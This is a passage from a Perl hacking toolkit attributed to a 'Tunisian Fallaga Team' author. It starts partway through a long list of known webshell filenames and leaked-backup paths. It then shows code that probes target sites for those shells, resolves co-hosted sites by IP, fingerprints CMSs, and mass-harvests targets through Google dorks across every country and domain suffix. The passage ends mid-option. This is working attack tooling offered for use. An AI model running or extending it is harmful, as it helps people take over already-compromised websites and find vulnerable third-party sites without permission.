'/includes/spy.aspx',
'/includes/xd.php',
'/includes/tmp/xd.php',
'/includes/sym/root/home/',
'/includes/billing/killer.php',
'/includes/tmp/upload.php',
'/includes/tmp/admin.php',
'/includes/Server.php',
'/includes/tmp/uploads.php',
'/includes/tmp/up.php',
'/includes/Server/',
'/includes/wp-admin/c99.php',
'/includes/tmp/priv8.php',
'/includes/priv8.php',
'/includes/cgi.pl/',
'/includes/tmp/cgi.pl',
'/includes/downloads/dom.php',
'/includes/webadmin.html',
'/includes/admins.php',
'/includes/bluff.php',
'/includes/king.jeen',
'/includes/admins/',
'/includes/admins.asp',
'/includes/admins.php',
'/includes/wp.zip',
'/includes/',
'/templates/rhuk_milkyway/WSO.php',
'/templates/rhuk_milkyway/dz.php',
'/templates/rhuk_milkyway/DZ.php',
'/templates/rhuk_milkyway/cpanel.php',
'/templates/rhuk_milkyway/cpn.php',
'/templates/rhuk_milkyway/sos.php',
'/templates/rhuk_milkyway/term.php',
'/templates/rhuk_milkyway/Sec-War.php',
'/templates/rhuk_milkyway/sql.php',
'/templates/rhuk_milkyway/ssl.php',
'/templates/rhuk_milkyway/mysql.php',
'/templates/rhuk_milkyway/WolF.php',
'/templates/rhuk_milkyway/madspot.php',
'/templates/rhuk_milkyway/Cgishell.pl',
'/templates/rhuk_milkyway/killer.php',
'/templates/rhuk_milkyway/changeall.php',
'/templates/rhuk_milkyway/2.php',
'/templates/rhuk_milkyway/Sh3ll.php',
'/templates/rhuk_milkyway/dz0.php',
'/templates/rhuk_milkyway/dam.php',
'/templates/rhuk_milkyway/user.php',
'/templates/rhuk_milkyway/dom.php',
'/templates/rhuk_milkyway/whmcs.php',
'/templates/rhuk_milkyway/vb.zip',
'/templates/rhuk_milkyway/r00t.php',
'/templates/rhuk_milkyway/c99.php',
'/templates/rhuk_milkyway/gaza.php',
'/templates/rhuk_milkyway/1.php',
'/templates/rhuk_milkyway/d0mains.php',
'/templates/rhuk_milkyway/madspotshell.php',
'/templates/rhuk_milkyway/info.php',
'/templates/rhuk_milkyway/egyshell.php',
'/templates/rhuk_milkyway/Sym.php',
'/templates/rhuk_milkyway/c22.php',
'/templates/rhuk_milkyway/c100.php',
'/templates/rhuk_milkyway/configuration.php',
'/templates/rhuk_milkyway/g.php',
'/templates/rhuk_milkyway/xx.pl',
'/templates/rhuk_milkyway/ls.php',
'/templates/rhuk_milkyway/Cpanel.php',
'/templates/rhuk_milkyway/k.php',
'/templates/rhuk_milkyway/zone-h.php',
'/templates/rhuk_milkyway/tmp/user.php',
'/templates/rhuk_milkyway/tmp/Sym.php',
'/templates/rhuk_milkyway/cp.php',
'/templates/rhuk_milkyway/tmp/madspotshell.php',
'/templates/rhuk_milkyway/tmp/root.php',
'/templates/rhuk_milkyway/tmp/whmcs.php',
'/templates/rhuk_milkyway/tmp/index.php',
'/templates/rhuk_milkyway/tmp/2.php',
'/templates/rhuk_milkyway/tmp/dz.php',
'/templates/rhuk_milkyway/tmp/cpn.php',
'/templates/rhuk_milkyway/tmp/changeall.php',
'/templates/rhuk_milkyway/tmp/Cgishell.pl',
'/templates/rhuk_milkyway/tmp/sql.php',
'/templates/rhuk_milkyway/0day.php',
'/templates/rhuk_milkyway/tmp/admin.php',
'/templates/rhuk_milkyway/L3b.php',
'/templates/rhuk_milkyway/d.php',
'/templates/rhuk_milkyway/tmp/d.php',
'/templates/rhuk_milkyway/tmp/L3b.php',
'/templates/rhuk_milkyway/sado.php',
'/templates/rhuk_milkyway/admin1.php',
'/templates/rhuk_milkyway/upload.php',
'/templates/rhuk_milkyway/up.php',
'/templates/rhuk_milkyway/vb.zip',
'/templates/rhuk_milkyway/vb.rar',
'/templates/rhuk_milkyway/admin2.asp',
'/templates/rhuk_milkyway/uploads.php',
'/templates/rhuk_milkyway/sa.php',
'/templates/rhuk_milkyway/sysadmins/',
'/templates/rhuk_milkyway/admin1/',
'/templates/rhuk_milkyway/sniper.php',
'/templates/rhuk_milkyway/images/Sym.php',
'/templates/rhuk_milkyway//r57.php',
'/templates/rhuk_milkyway/gzaa_spysl',
'/templates/rhuk_milkyway/sql-new.php',
'/templates/rhuk_milkyway//shell.php',
'/templates/rhuk_milkyway//sa.php',
'/templates/rhuk_milkyway//admin.php',
'/templates/rhuk_milkyway//sa2.php',
'/templates/rhuk_milkyway//2.php',
'/templates/rhuk_milkyway//gaza.php',
'/templates/rhuk_milkyway//up.php',
'/templates/rhuk_milkyway//upload.php',
'/templates/rhuk_milkyway//uploads.php',
'/templates/rhuk_milkyway/shell.php',
'/templates/rhuk_milkyway//amad.php',
'/templates/rhuk_milkyway//t00.php',
'/templates/rhuk_milkyway//dz.php',
'/templates/rhuk_milkyway//site.rar',
'/templates/rhuk_milkyway//Black.php',
'/templates/rhuk_milkyway//site.tar.gz',
'/templates/rhuk_milkyway//home.zip',
'/templates/rhuk_milkyway//home.rar',
'/templates/rhuk_milkyway//home.tar',
'/templates/rhuk_milkyway//home.tar.gz',
'/templates/rhuk_milkyway//forum.zip',
'/templates/rhuk_milkyway//forum.rar',
'/templates/rhuk_milkyway//forum.tar',
'/templates/rhuk_milkyway//forum.tar.gz',
'/templates/rhuk_milkyway//test.txt',
'/templates/rhuk_milkyway//ftp.txt',
'/templates/rhuk_milkyway//user.txt',
'/templates/rhuk_milkyway//site.txt',
'/templates/rhuk_milkyway//error_log',
'/templates/rhuk_milkyway//error',
'/templates/rhuk_milkyway//cpanel',
'/templates/rhuk_milkyway//awstats',
'/templates/rhuk_milkyway//site.sql',
'/templates/rhuk_milkyway//vb.sql',
'/templates/rhuk_milkyway//forum.sql',
'/templates/rhuk_milkyway/r00t-s3c.php',
'/templates/rhuk_milkyway/c.php',
'/templates/rhuk_milkyway//backup.sql',
'/templates/rhuk_milkyway//back.sql',
'/templates/rhuk_milkyway//data.sql',
'/templates/rhuk_milkyway/wp.rar/',
'/templates/rhuk_milkyway/asp.aspx',
'/templates/rhuk_milkyway/tmp/vaga.php',
'/templates/rhuk_milkyway/tmp/killer.php',
'/templates/rhuk_milkyway/whmcs.php',
'/templates/rhuk_milkyway/abuhlail.php',
'/templates/rhuk_milkyway/tmp/killer.php',
'/templates/rhuk_milkyway/tmp/domaine.pl',
'/templates/rhuk_milkyway/tmp/domaine.php',
'/templates/rhuk_milkyway/useradmin/',
'/templates/rhuk_milkyway/tmp/d0maine.php',
'/templates/rhuk_milkyway/d0maine.php',
'/templates/rhuk_milkyway/tmp/sql.php',
'/templates/rhuk_milkyway/X.php',
'/templates/rhuk_milkyway/123.php',
'/templates/rhuk_milkyway/m.php',
'/templates/rhuk_milkyway/b.php',
'/templates/rhuk_milkyway/up.php',
'/templates/rhuk_milkyway/tmp/dz1.php',
'/templates/rhuk_milkyway/dz1.php',
'/templates/rhuk_milkyway/forum.zip',
'/templates/rhuk_milkyway/Symlink.php',
'/templates/rhuk_milkyway/Symlink.pl',
'/templates/rhuk_milkyway/forum.rar',
'/templates/rhuk_milkyway/joomla.zip',
'/templates/rhuk_milkyway/joomla.rar',
'/templates/rhuk_milkyway/wp.php',
'/templates/rhuk_milkyway/buck.sql',
'/templates/rhuk_milkyway/sysadmin.php',
'/templates/rhuk_milkyway/images/c99.php',
'/templates/rhuk_milkyway/xd.php',
'/templates/rhuk_milkyway/c100.php',
'/templates/rhuk_milkyway/spy.aspx',
'/templates/rhuk_milkyway/xd.php',
'/templates/rhuk_milkyway/tmp/xd.php',
'/templates/rhuk_milkyway/sym/root/home/',
'/templates/rhuk_milkyway/billing/killer.php',
'/templates/rhuk_milkyway/tmp/upload.php',
'/templates/rhuk_milkyway/tmp/admin.php',
'/templates/rhuk_milkyway/Server.php',
'/templates/rhuk_milkyway/tmp/uploads.php',
'/templates/rhuk_milkyway/tmp/up.php',
'/templates/rhuk_milkyway/Server/',
'/templates/rhuk_milkyway/wp-admin/c99.php',
'/templates/rhuk_milkyway/tmp/priv8.php',
'/templates/rhuk_milkyway/priv8.php',
'/templates/rhuk_milkyway/cgi.pl/',
'/templates/rhuk_milkyway/tmp/cgi.pl',
'/templates/rhuk_milkyway/downloads/dom.php',
'/templates/rhuk_milkyway/webadmin.html',
'/templates/rhuk_milkyway/admins.php',
'/templates/rhuk_milkyway/bluff.php',
'/templates/rhuk_milkyway/king.jeen',
'/templates/rhuk_milkyway/admins/',
'/templates/rhuk_milkyway/admins.asp',
'/templates/rhuk_milkyway/admins.php',
'/templates/rhuk_milkyway/wp.zip',
'/templates/rhuk_milkyway/','WSO.php',
'a.php',
'z.php',
'e.php',
'r.php',
'xz.php',
'hhh.php',
'fuck.php',
'hb.php',
't.php',
'y.php',
'u.php',
'i.php',
'o.php',
'p.php',
'q.php',
's.php',
'd.php',
'f.php',
'g.php',
'h.php',
'j.php',
'k.php',
'l.php',
'm.php',
'w.php',
'x.php',
'c.php',
'v.php',
'b.php',
'n.php',
'1.php',
'2.php',
'3.php',
'4.php',
'5.php',
'6.php',
'7.php',
'8.php',
'9.php',
'10.php',
'12.php',
'11.php',
'1234.php',);

foreach $myshell(@path){

$url = $site.$myshell;
$req = HTTP::Request->new(GET=>$url);
$useragent = LWP::UserAgent->new();

$response = $useragent->request($req);

if ($response->is_success){
print color("bold Green"),("[Webshell Found] ==> $url  \n");
open(save, '>>Result/shellfound.txt');
   print save "$url\n";  
   close(save);
}else{
print color("bold red"),("[Webshell Not Found] ==> $myshell\n");
}
}


}
if ($whatspywant eq '10'){




if($^O =~ /Win/){
 
   system("cls");
   system("color a");
   system("title Get Sites by : ip");
 
}else{
 
   system("clear");
}
print color 'reset';
print color("bold Red"), "\nPut IP Address : ";
my $host = <>;
chomp($host);
my $ua = LWP::UserAgent->new(agent => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5');
my $zz = $ua->post('https://www.yougetsignal.com/tools/web-sites-on-web-server/',
{
        remoteAddress => $host,
}
);
 
my $resulta = $zz->content;
while ($resulta =~ m/\[([^\]]*)\]/g)
{
        $zeb = $1;
        $zeb =~ m/\"(.*?)\", \"?\"/g;
open(a, ">>$host.txt");
print a "http://$1/\n";
close(a);
}
print "\nresult in $host.txt";
exit



}

if ($whatspywant eq '11'){
print color("bold red")," List Sites --> ";
$opn=<STDIN>;
chomp $opn;

open(tarrget,"$opn") or die "$!";
while(<tarrget>){
chomp($_);
$target = $_;
close(FILE);
 
# For each hostname, fetch the IP address
foreach $hostname ($target) {
   chomp($hostname);
   if($hostname) {
      $ip = gethostbyname($hostname);
      if($ip) {
        
		print "\n" , $hostname."==>".inet_ntoa($ip);
		
		open (TEXT, '>>list Ip.txt');
print TEXT "\n" , "".inet_ntoa($ip);
undef $ip;
close (TEXT);
        
      } else {
        # Print 0.0.0.0 for unresolved Hostnames
        printf "%sn\n" , $hostname.":0.0.0.0";
        undef $ip;
      }
   }
}
}

exit
}

if($whatspywant eq '12'){
####################### LIMPAR O TERMINAL ############################################
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
####################### DISCRIÇÃO ####################################################
$script = 'CMS DETECTOR';
$author = 'Wissem Mahfoud';
$version = '0.0.1';
$team = 'Tunisian Fallaga Team';
$update = '10/05/2017';
$greetz = 'All friends';
####################### CRIANDO O DIRETORIO RESULT PARA SALVAR OS .TXT ###############
$res="CMS";
    if (-e $res)
    {
    }
    else
    {
        mkdir $res or die "NAO CONSEGUIMOS CRIAR O DIRETORIO: $res";
    }
################# INICIO  #############
 
print "\n";
print colored("         --=[ $script",'BOLD WHITE'),"\n";
print colored("         +---**---==[ Version: $version ",'BOLD GREEN'),"\n";
print colored("         +---**---==[ Author: $author  ",'BOLD WHITE'),"\n";
print colored("         +---**---==[ Update Date : $update ",'BOLD GREEN'),"\n";
print colored("         +---**---==[ Team: $team  ",'BOLD WHITE'),"\n";
print colored("         +---**---==[ Agradecimentos: $greetz  ",'BOLD GREEN'),"\n";
 
 
print colored("+------------------------------------------------------------------------+",'red'),"\n";
print colored("+------------------------------------------------------------------------+",'red'),"\n";
 
########## PART WORK #################
print colored("[Your website list]: ",'BOLD WHITE');
 
$lista=<STDIN>;
chomp($lista);
open (lista, "<$lista") || die "\n [LISTA DE SITES NÃO SELECIONADA]";
my @lista = <lista>;
close lista;
 
foreach $site(@lista) {
 
if($site !~ /http:\/\//) { $site = "http://$site/"; };
detect();
}
sub detect($site){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (8);
 
#################### PARTE DETECTANDO O CMS WORDPRESS ##################################
my $checar = $ua->get("$site")->content;
if($checar =~/wp-content\/themes\/|wp-content\/plugins\/|wordpress/) {
    print colored("[WORDPRESS]: $site",'WHITE ON_CYAN'),"\n";
open(save, '>>CMS/WordPress.txt');
    print save "$site\n";
    close(save);
}
#################### PARTE DETECTANDO O CMS JOOMLA ##################################
elsif($checar =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>|Joomla!|Joomla|joomla/) {
   print colored("[JOOMLA]: $site",'WHITE ON_GREEN'),"\n";
open(save, '>>CMS/Joomla.txt');
   print save "$site\n";  
   close(save);
   }
#################### PARTE DETECTANDO O CMS VBULLETIN ##################################
elsif($checar =~/\/faq.php\/vb|\/forum\/|Powred by vbulletin/) {
   print colored("[VBULLETIN]: $site",'WHITE ON_RED'),"\n";
open(save, '>>CMS/VBulletin.txt');
   print save "$site\n";  
   close(save);
 }
#################### PARTE DETECTANDO O CMS DRUPAL ##################################
elsif($checar =~/\/modules\/system\/system.menus.css|\/sites\/default\/files\/|<meta name=\"Generator\" content=\"Drupal 7/) {
   print colored("[DRUPAL]: $site",'WHITE ON_BLUE'),"\n";
open(save, '>>CMS/Drupal.txt');
   print save "$site\n";  
   close(save);
   }
#################### CMS NÃO DETECTADO ##################################
else{
   print colored("[CMS NO DETECTED]: $site",'BOLD WHITE'),"\n";
   open(save, '>>CMS/Cms_N_Detected.txt');
   print save "$site\n";
   close(save);
}
}

}
if($whatspywant eq '13'){

print color 'reset';
print color("bold Green"), "\n";
print color 'reset';
print color 'reset';
print color("bold red"), "                      {*} Grab Site From Google By Dork {*}               \n";
print color 'reset';
print color("bold Green"), "\n";

$ag = LWP::UserAgent->new();
$ag->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ag->timeout(10);


print color("bold Green"),"Dork: ";
$dork=<STDIN>;
chomp $dork;
print color("yellow"), "\n";


for (my $i=1; $i<=2000; $i+=10) {
$url = "https://www.google.com/search?q=$dork&start=".$i;
$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;




 
while($rrs =~ m/http:\/\/(.*?)\//g){



$link = $1;
	if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|w3|microsof/)
	{
				if ($link !~ /^http:/)
			 {
				$link = 'http://' . "$link" . '/';
			 }



if($link !~ /\"|\?|\=|index\.php/){
					if  (!  grep (/$link/,@result))
					{
print "$link\n";
open(save, '>>Google-Sites.txt');
    print save "$link\n";
    close(save);
						push(@result,$link);
					}
} 
}
}
}

}
if ($whatspywant eq '14'){
my $datetime    = localtime;
$mech = WWW::Mechanize->new(autocheck => 0);
$ag = LWP::UserAgent->new();
$ag->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ag->timeout(10);
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
$res="target";
    if (-e $res)
    {
    }
    else
    {
        mkdir $res or die "WE CAN NOT CREATE THE BOARD OF DIRECTORS: $res";
    }
	
	                                    ################################## START ##################################
										
$logo="

                                                                                                                               
'########:::::'###::::'########::'#######:::'#######::'##:::'##::::'###::::
 ##.... ##:::'## ##:::..... ##::'##.... ##:'##.... ##: ##::'##::::'## ##:::
 ##:::: ##::'##:. ##:::::: ##::: ##:::: ##: ##:::: ##: ##:'##::::'##:. ##::
 ########::'##:::. ##:::: ##:::: ##:::: ##: ##:::: ##: #####::::'##:::. ##:
 ##.... ##: #########::: ##::::: ##:::: ##: ##:::: ##: ##. ##::: #########:
 ##:::: ##: ##.... ##:: ##:::::: ##:::: ##: ##:::: ##: ##:. ##:: ##.... ##:
 ########:: ##:::: ##: ########:. #######::. #######:: ##::. ##: ##:::: ##:
........:::..:::::..::........:::.......::::.......:::..::::..::..:::::..:: V1.2 Coded By Wissem Mahfoud

";
print color("red"),$logo;
print colored ("                       Start At $datetime                                      ",'white on_black'),"\n";
print color("green" ), "\t   [";print color("red"),"1";print color("green"),"]  **  --> Mass Grab by ip or site list \n";
print color("green" ), "\t   [";print color("red"),"2";print color("green"),"]  **  --> Mass Grab Range by ip or site list \n";
print color("green" ), "\t   [";print color("red"),"3";print color("green"),"]  **  --> choose ur country u want it \n";
print color("green" ), "\t   [";print color("red"),"4";print color("green"),"]  **  --> find sites in all COUNTRY domain \n";
print color("green" ), "\t   [";print color("red"),"5";print color("green"),"]  **  --> find sites in all WORK domainS \n";
print color("green" ), "\t   [";print color("red"),"6";print color("green"),"]  **  --> find sites in ALL domainS \n";
print color("green" ), "\t   [";print color("red"),"7";print color("green"),"]  **  --> extract sites from ip server \n";
print color("green" ), "\t   [";print color("red"),"0";print color("green"),"]  **  --> GO_BACK <-- \n\n\n";
print color("green"),"[+] Choose Number : ";
my $toolZ = <STDIN>;
chomp $toolZ;
if($toolZ eq '0')
{
system(($^O eq 'MSWin32') ? 'run.pl' : 'run.pl');
}
if($toolZ eq '1')
{
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
$logo="

                                                                                                                               
'########:::::'###::::'########::'#######:::'#######::'##:::'##::::'###::::
 ##.... ##:::'## ##:::..... ##::'##.... ##:'##.... ##: ##::'##::::'## ##:::
 ##:::: ##::'##:. ##:::::: ##::: ##:::: ##: ##:::: ##: ##:'##::::'##:. ##::
 ########::'##:::. ##:::: ##:::: ##:::: ##: ##:::: ##: #####::::'##:::. ##:
 ##.... ##: #########::: ##::::: ##:::: ##: ##:::: ##: ##. ##::: #########:
 ##:::: ##: ##.... ##:: ##:::::: ##:::: ##: ##:::: ##: ##:. ##:: ##.... ##:
 ########:: ##:::: ##: ########:. #######::. #######:: ##::. ##: ##:::: ##:
........:::..:::::..::........:::.......::::.......:::..::::..::..:::::..:: V1.2 Coded By Wissem Mahfoud

";
print color("red"),$logo;
print "[Put A Ip List path or websites BUT websites should be www.site.com without http : ... ]\n";
print " Path to your websites list:";
my $list=<STDIN>;
chomp($list);
	open (THETARGET, "<$list") || die "[-] Can't open file ";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;
OUTER: foreach $tofuck(@TARGETS){
chomp($tofuck);
if($tofuck =~ /http:\/\/(.*)\//)
{
$tofuck= $1;
gettt();
}
else
{
gettt();
}
}
}
if($toolz eq '2')
{
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
$logo="

                                                                                                                               
'########:::::'###::::'########::'#######:::'#######::'##:::'##::::'###::::
 ##.... ##:::'## ##:::..... ##::'##.... ##:'##.... ##: ##::'##::::'## ##:::
 ##:::: ##::'##:. ##:::::: ##::: ##:::: ##: ##:::: ##: ##:'##::::'##:. ##::
 ########::'##:::. ##:::: ##:::: ##:::: ##: ##:::: ##: #####::::'##:::. ##:
 ##.... ##: #########::: ##::::: ##:::: ##: ##:::: ##: ##. ##::: #########:
 ##:::: ##: ##.... ##:: ##:::::: ##:::: ##: ##:::: ##: ##:. ##:: ##.... ##:
 ########:: ##:::: ##: ########:. #######::. #######:: ##::. ##: ##:::: ##:
........:::..:::::..::........:::.......::::.......:::..::::..::..:::::..:: V1.2 Coded By Wissem Mahfoud

";
print color("red"),$logo;
print "[Put A Ip List path or websites BUT websites should be www.site.com without http : ... ]\n";
print " Path to your websites list:";
my $list=<STDIN>;
chomp($list);
	open (THETARGET, "<$list") || die "[-] Can't open file";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;
OUTER: foreach $tofuck(@TARGETS){
chomp($tofuck);
if($tofuck =~ /http:\/\/(.*)\//) {
$tofuck= $1;
gett();
}else{
gett();
}
}
}
if($toolZ eq '3')
{
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
$logo="

                                                                                                                               
'########:::::'###::::'########::'#######:::'#######::'##:::'##::::'###::::
 ##.... ##:::'## ##:::..... ##::'##.... ##:'##.... ##: ##::'##::::'## ##:::
 ##:::: ##::'##:. ##:::::: ##::: ##:::: ##: ##:::: ##: ##:'##::::'##:. ##::
 ########::'##:::. ##:::: ##:::: ##:::: ##: ##:::: ##: #####::::'##:::. ##:
 ##.... ##: #########::: ##::::: ##:::: ##: ##:::: ##: ##. ##::: #########:
 ##:::: ##: ##.... ##:: ##:::::: ##:::: ##: ##:::: ##: ##:. ##:: ##.... ##:
 ########:: ##:::: ##: ########:. #######::. #######:: ##::. ##: ##:::: ##:
........:::..:::::..::........:::.......::::.......:::..::::..::..:::::..:: V1.2 Coded By Wissem Mahfoud

";
print color("red"),$logo;
print "[Here You Can Choose The Country Dork exp: inurl:.asp?id= site:co.il ]\n";
print "Give Me Dork:";
$dork=<STDIN>;
chomp($dork);
$dork=~s/ /+/g;
crew();
}
if($toolZ eq '4')
{
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
$logo="

                                                                                                                               
'########:::::'###::::'########::'#######:::'#######::'##:::'##::::'###::::
 ##.... ##:::'## ##:::..... ##::'##.... ##:'##.... ##: ##::'##::::'## ##:::
 ##:::: ##::'##:. ##:::::: ##::: ##:::: ##: ##:::: ##: ##:'##::::'##:. ##::
 ########::'##:::. ##:::: ##:::: ##:::: ##: ##:::: ##: #####::::'##:::. ##:
 ##.... ##: #########::: ##::::: ##:::: ##: ##:::: ##: ##. ##::: #########:
 ##:::: ##: ##.... ##:: ##:::::: ##:::: ##: ##:::: ##: ##:. ##:: ##.... ##:
 ########:: ##:::: ##: ########:. #######::. #######:: ##::. ##: ##:::: ##:
........:::..:::::..::........:::.......::::.......:::..::::..::..:::::..:: V1.2 Coded By Wissem Mahfoud

";
print color("red"),$logo;
print "[Just Put Your Dork And I will Scan All World COUNTRY Sites Area ]\n";
print "Give Me Dork:";
$dor=<STDIN>;
chomp($dor);
$dor=~s/ /+/g;

@country= ("af","al","dz","as","ad","ao","ai","aq","ag","ar","am","aw","au","at","az","bs","bh","bd","bb","by","be","bz","bj","bm","bt","bo","ba","bw","bv","br","io","bn","bg","bf","bi","kh","cm","ca","cv","ky","cf","td","cl","cn","cx","cc","co","km","cg","cd","ck","cr","ci","hr","cy","cz","dk","dj","dm","do","tl","ec","eg","sv","gq","er","ee","et","fk","fo","fj","fi","fr","gf","pf","tf","ga","gm","ge","de","gh","gi","gr","gl","gd","gp","gu","gt","gn","gw","gy","ht","hm","hn","hk","hu","is","in","id","iq","ie","il","it","jm","jp","jo","kz","ke","ki","kw","kg","la","lv","lb","ls","lr","ly","li","lt","lu","mo","mk","mg","mw","my","mv","ml","mt","mh","mq","mr","mu","yt","mx","fm","md","mc","mn","ms","ma","mz","na","nr","np","nl","an","nc","nz","ni","ne","ng","nu","nf","mp","no","om","pk","pw","ps","pa","pg","py","pe","ph","pn","pl","pt","pr","qa","re","ro","ru","rw","kn","lc","vc","ws","sm","st","sa","sn","cs","sc","sl","sg","sk","si","sb","so","za","gs","kr","es","lk","sh","pm","sr","sj","sz","se","ch","tw","tj","tz","th","tg","tk","to","tt","tn","tr","tm","tc","tv","ug","ua","ae","gb","us","um","uy","uz","vu","va","ve","vn","vg","vi","wf","eh","ye","zm","zw");

OUTER: foreach $country(@country){
chomp $country;
$dork="$dor+site:$country";
print color("red"),"ur domain is [ ";
print color('reset');
print color("green"),"$domains ]\n";
print color('reset');
THE();
}
}

if($toolZ eq '5')
{
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
$logo="

                                                                                                                               
'########:::::'###::::'########::'#######:::'#######::'##:::'##::::'###::::
 ##.... ##:::'## ##:::..... ##::'##.... ##:'##.... ##: ##::'##::::'## ##:::
 ##:::: ##::'##:. ##:::::: ##::: ##:::: ##: ##:::: ##: ##:'##::::'##:. ##::
 ########::'##:::. ##:::: ##:::: ##:::: ##: ##:::: ##: #####::::'##:::. ##:
 ##.... ##: #########::: ##::::: ##:::: ##: ##:::: ##: ##. ##::: #########:
 ##:::: ##: ##.... ##:: ##:::::: ##:::: ##: ##:::: ##: ##:. ##:: ##.... ##:
 ########:: ##:::: ##: ########:. #######::. #######:: ##::. ##: ##:::: ##:
........:::..:::::..::........:::.......::::.......:::..::::..::..:::::..:: V1.2 Coded By Wissem Mahfoud

";
print color("red"),$logo;
print "[Scan All the 'work' Domains Categories ]\n";
print "Dork please :";
$dor=<STDIN>;
chomp($dor);
$dor=~s/ /+/g;

@domains= ("gov","edu","com","net","info","tv","travel","biz","mobi","tel","int","mil","eu","design","online","shop","clup","asia","academy","accountant","accountants","actor","adult","ae.org","africa","agency","apartement","com.ar","archi","art","associates","attorney","com.au","id.au","net.au","org.au","auction","band","bar","bargains","bayern","beer","berlin","best","bet","bid","bike","bingo","bio","biz","black","blog","blue","boutique","br.com","brussels","build","buiders","business","buzz","cab","cafe","cam","camera","camp","capetown","capital","cards","care","career","careers","casa","cash","casino","catering","center","chat","cheap","church","city","claims","cleaning","click","clinic","clothing","cloud","cn.com","co.uk","coach","codes","coffee","college","community","company","computer","construction","consulting","contractors","cooking","cool","country","coupons","courses","credit","cricket","cruises","dance","date","dating","deals","degree","delivery","democrat","dental","dentist","diamonds","digital","direct","directory","discount","doctor","dog","domains","durban","download","earth","eco","education","email","energy","engineer","engineering","enterprises","equipment","estate","eu.com","events","exchange","expert","exposed","express","fail","faith","family","fans","farm","fashion","finance","finance","financial","fish","fishing","fit","fitness","flights","florist","fm","football","forsale","foundation","fun","fund","furniture","futbol","fyi","gallery","games","garden","gift","gifts","gives","glass","global","gold","golf","graphics","gratis","green","gripe","group","guide","guru","hamburg","haus","health","healthcare","help","hockey","holiday","horse","hospital","host","house","how","ht","immo","immobilien","industries","ink","institute","insure","international","investments","jetzt","jewelry","joburg","jpn.com","kaufen","kim","kitchen","kiwi","koeln","kyoto","land","lat","lawyer","lease","legal","lgbt","life","lighting","limited","limo","link","live","loan","loans","lol","london","love","ltd","maison","management","marketing","mba","media","melbourne","men","menu","miami","mobi","moda","moe","mom","money","mortgage","nagoya","name","network","news","ngo","ninja","nyc","ac.nz","org.nz","kiwi.nz","net.nz","school.nz","gen.nz","geen.nz","co.nz","maori.nz","okinawa","one","onl","organic","osaka","paris","partners","parts","party","pet","photo","photography","photos","pics","pictures","pink","pizza","place","plumbing","plus","poker","porn","press","pro","productions","promo","properties","pub","qpon","quebec","racing","recipes","red","rehab","reise","reisen","rent","rentals","repair","report","republican","rest","restaurant","review","reviews","rip","rocks","rodeo","ru.com","run","ryukyu","sa.com","sale","salon","sarl","com.sb","school","schule","science","scot","services","sexy","com.sg","shiksha","shoes","shopping","show","singles","site","ski","soccer","social","software","solar","solutions","soy","space","stop","store","stream","studio","study","style","supplies","supply","support","sure","surgery","sydney","systems","taipei","tattoo","tax","taxi","team","tech","technology","tel","tennis","theater","tienda","tips","tires","today","tokyo","tools","top","tours","town","toys","trade","trading","training","tube","org.uk","me.uk","uk.com","university","uno","us.com","vacations","vc","vegas","ventures","vet","viajes","video","villas","vin","vip","vision","vlaanderen","vodka","vote","voting","voyage","wales","wang","watch","webcam","website","wedding","wf","wien","wiki","win","wine","work","works","world","wtf","??","??","???","???","?????","??","???","??","??","??","XYZ","YOGA","yokohama","yt","co.za","za.com","zone");

OUTER: foreach $domains(@domains){
chomp $domains;
$dork="$dor+site:$domains";
print color("red"),"ur domain is [ ";
print color('reset');
print color("green"),"$domains ]\n";
print color('reset');
THE();
}
}
if($toolZ eq '6')
{
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
$logo="

                                                                                                                               
'########:::::'###::::'########::'#######:::'#######::'##:::'##::::'###::::
 ##.... ##:::'## ##:::..... ##::'##.... ##:'##.... ##: ##::'##::::'## ##:::
 ##:::: ##::'##:. ##:::::: ##::: ##:::: ##: ##:::: ##: ##:'##::::'##:. ##::
 ########::'##:::. ##:::: ##:::: ##:::: ##: ##:::: ##: #####::::'##:::. ##:
 ##.... ##: #########::: ##::::: ##:::: ##: ##:::: ##: ##. ##::: #########:
 ##:::: ##: ##.... ##:: ##:::::: ##:::: ##: ##:::: ##: ##:. ##:: ##.... ##:
 ########:: ##:::: ##: ########:. #######::. #######:: ##::. ##: ##:::: ##:
........:::..:::::..::........:::.......::::.......:::..::::..::..:::::..:: V1.2 Coded By Wissem Mahfoud

";
print color("red"),$logo;
print " [ ALL Domains ( Countrys+Work ) ]\n";
print "Dork please :";
$dor=<STDIN>;
chomp($dor);
$dor=~s/ /+/g;

